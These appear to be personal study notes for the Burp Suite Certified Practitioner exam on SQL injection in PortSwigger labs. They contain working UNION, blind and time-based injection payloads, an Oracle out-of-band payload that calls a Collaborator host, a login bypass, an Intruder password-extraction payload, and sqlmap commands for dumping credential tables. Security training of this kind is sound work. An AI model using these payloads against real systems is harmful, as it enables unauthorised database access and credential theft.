## Stage 2 + 3
### Useful Resources
[Burp SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### How to Determine the Database Tech?
Different db tech/products requires different payloads. Look at the Burp SQLi cheat sheet. 
#### Example 1 #ExamTip 
Using the command to check for the database's version to determine the db tech. If it response with 200 OK then we'll know the db tech.
1. Determine if the app is vulnerable to SQLi by adding a single quote to a param and getting a 500.
	1. ![[SQLi-20260109101127959.png]]
2. Go to the SQLi cheat sheet and try these commands. *Keep the single quote*.
	1. |Oracle|
		1. `+UNION+SELECT+banner+FROM+v$version,+NULL--`
		2. `+UNION+SELECT+version+FROM+v$instance,+NULL--`
	2. |Microsoft|: `+UNION+SELECT+@@version,+NULL--`
	3. |PostgreSQL|: `+UNION+SELECT+version(),+NULL--`
	4. |MySQL|: `+UNION+SELECT+@@version,+NULL--`
3. Got a 200 OK and can search for the name in the response to get the version number. This app uses PostgreSQL.
	1. ![[SQLi-20260109103747814.png]]

#### Example 2
The following example is to determine the db via DNS lookup. 
1. This is the payload for an Oracle db
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```
2. We need to insert our burp collaborator URL and include these characters around the payload like `' || (PAYLOAD)--` *IMPORTANT*: include the parentheses `()`.
3. Then we need to URL encode key characters
	1. ![[SQLi-20260108152621295.png]]
```
'+||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//dyfefrfrz0zoba1rlzlcp6208res2iq7.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--
```
4. If single quote doesn't work, try semicolon but have to URL encode that to `%3B`.
5. Send and Poll collaborator. If we get a response back then that determines the db.
	1. ![[SQLi-20260108152741588.png]]

### SQLmap (TL;DR)
**Remove the `{}`**.
- For `--technique`: it's T = Time-based, U = UNION, E = Error-based, B = Boolean
- `--level=5` or at least `--level=2` is need to test cookie params like TrackingId
- Use `--risk=3`
- Cannot use `-p` if testing cookie params bc sqlmap only looks for URL and body params using that flag
```
# 1.1.Test URL param
sqlmap -u {cURL_COMMAND} -p '{PARAM_TO_TEST}' --batch --level=5

# 1.2.Test cookie
sqlmap -u '{URL}' --cookie='{COOKIE_NAME_AND_VALUE}' --batch --level=2

# 2.Test payload in browser or burp
# 3.List database(s)
sqlmap -u {cURL_COMMAND} -p '{VULNERABLE_PARAM}' --batch --dbms {DATABASE} --technique {T/U/E/B} --level=5 --risk=3 --dbs

# 4.List table(s)
sqlmap -u {cURL_COMMAND} -p '{VULNERABLE_PARAM}' --batch --dbms {DATABASE} --technique {T/U/E/B} --level=5 --risk=3 -D {DATABASE_NAME} --tables

# 5.Dump table contents
sqlmap -u {cURL_COMMAND} -p '{VULNERABLE_PARAM}' --batch --dbms {DATABASE} --technique {T/U/E/B} --level=5 --risk=3 -D {DATABASE_NAME} -T {TABLE_NAME} --dump
```

#### USE THIS ONE IT IS FASTER!
**Alternative to pasting in a cURL command == burp to save the request.** It's cleaner this way + don't need to specify `--cookie` 
1. Remove any `'` from the URL (Sqlmap doesn't like that)
2. Right click on request > Save item > name it like `sqli_request`
 ```
# get the sqli vuln, database tech, database name
sqlmap -r sqli_request --level=5 --risk=3 -p 'organize_by' --batch
 
# plug in the database tech + database name + get the table name
sqlmap -r sqli_request --level=5 --risk=3 -p 'organize_by' --batch --dbms={database_tech} -D {database_name} --tables

# plug in the table name + --dump to get the creds
sqlmap -r sqli_request --level=5 --risk=3 -p 'organize_by' --batch --dbms={database_tech} -D {database_name} -T {table_name} --dump
 ```
 
#### Blind SQLi
*These vulnerabilities might not even occur in a cookie. Practice exam show that it could be in a search term*
`TrackingId=abc' AND '1'='1;` check Content-Length
`TrackingId=abc' AND '1'='2;` If content length is different; check what's different in the response
- [[Blind SQLi#2.11. Lab Blind SQL injection with conditional responses ⭕️]]

`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` and it takes the server ~10secs to respond
*If `'` doesn't work, remove it and just try `%3B` onward.*
**Solution used in Intruder**: `;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--`
- [[Blind SQLi#2.15. Lab Blind SQL injection with time delays and information retrieval ⭕️]]


### Could Use SQLMAP to Identify SQLi Vulnerability
[Github](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#sqlmap)
https://youtu.be/yC0F05oggTE?t=563
#ExamTip 
1. Add a single quote `'` to a param and got a 500 internal server error. *Indicates potential SQLi vuln*.
	1. ![[README-20260217100852569.png|392]]
2. Chrome: Inspect > network > right click on url path > copy > copy as cURL
	1. ![[README-20260217101117440.png|402]]
3. Paste in terminal > replace `curl` with `sqlmap -u` > add `-p '{PARAM_TO_TEST} --batch`
	1. `--batch` says `yes` to every question sqlmap asks
	2. Before
		1. ![[README-20260217101215523.png]]
	3. After
		1. ![[README-20260217101347576.png]]
4. sqlmap found that `category` is injectable with time-based + UNION-based attacks
	1. ![[README-20260217101906601.png]]
	2. Time-based: Trying the payload below will take ~5secs from the server to get back. *Need to URL encode key characters*.
		1. ![[README-20260217102013207.png]]
		2. ![[README-20260217102101723.png]]
	3. UNION-based: URL encode the UNION payload and got the decoded (from ASCII) values in the response
		1. ![[README-20260217102515668.png]]
		2. ![[README-20260217102501421.png]]
5. List the databases: **`public` database was found**.
	1. Added `--dbms postgresql --technique U --dbs`
		1. `--technique U` for the UNION query attack
		2. `--dbs` to list out the databases
		3. ![[README-20260217102953131.png]]
6. List tables: `users_pgxmen`
	1. Replace `--dbs` with `-D public --tables`
	2. ![[README-20260217103217663.png]]
7. Dump table contents: **got the admin creds**!
	1. Replace `--tables` with `-T {TABLE_NAME} --dump`
	2. ![[README-20260217103349310.png]]


### Identify Vulnerabilities in Exam
- Bypass login: `username=administrator'--`

Try all of them again using this:
```
%3bSELECT+PG_SLEEP(5)%3b
```


Doesn't work.
#### `TrackingId` cookie
 add `'` to it
	- 200 OK
		- "Welcome back!" or *difference in response*
			- [[Blind SQLi#2.11. Lab Blind SQL injection with conditional responses ⭕️]]
		-  `'||+(SELECT+pg_sleep(10))--` == ~10sec response
			- [[Blind SQLi#2.14. Lab Blind SQL injection with time delays ⭕️]]
			- [[Blind SQLi#2.15. Lab Blind SQL injection with time delays and information retrieval ⭕️]]
		- [[Blind SQLi#2.16. Lab Blind SQL injection with out-of-band interaction ⭕️]]
		- [[Blind SQLi#2.17. Lab Blind SQL injection with out-of-band data exfiltration ⭕️]]
	- 500 Internal Server Error
		- `'--` added to the cookie == 200 OK
			- [[SQLi#2.13. Lab Visible error-based SQL injection ⭕️]]
			- [[Blind SQLi#2.12. Lab Blind SQL injection with conditional errors ⭕️]]

Doesn't work. **Need a better way to ID each lab manually in case SQLmap doesn't work.**
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+'abc','def'--` == 200 OK
			- [[SQLi#2.5. Lab SQL injection attack, listing the database contents on non-Oracle databases ⭕️]]
			- [[SQLi#2.9. Lab SQL injection UNION attack, retrieving data from other tables ⭕️]]
		- `'+UNION+SELECT+'abc','def'+FROM+dual--` == 200 OK
			- [[SQLi#2.3. Lab SQL injection attack, querying the database type and version on Oracle ⭕️]] 
			- [[SQLi#2.6. Lab SQL injection attack, listing the database contents on Oracle ⭕️]]
		- `'+UNION+SELECT+NULL,NULL,NULL--`
			- 200 OK 
				- [[SQLi#2.7. Lab SQL injection UNION attack, determining the number of columns returned by the query ⭕️]]
				- [[SQLi#2.8. Lab SQL injection UNION attack, finding a column containing text ⭕️]]
			- 500 Internal Server Error
				- [[SQLi#2.10. Lab SQL injection UNION attack, retrieving multiple values in a single column ⭕️]]
	- 500 Internal Server Error
		- `'+order+by+1#` == 200 OK
			- [[SQLi#2.4. Lab SQL injection attack, querying the database type and version on MySQL and Microsoft ⭕️]]

- `POST /product/stock` uses XML
		- [[SQLi#2.18. Lab SQL injection with filter bypass via XML encoding ⭕️]]


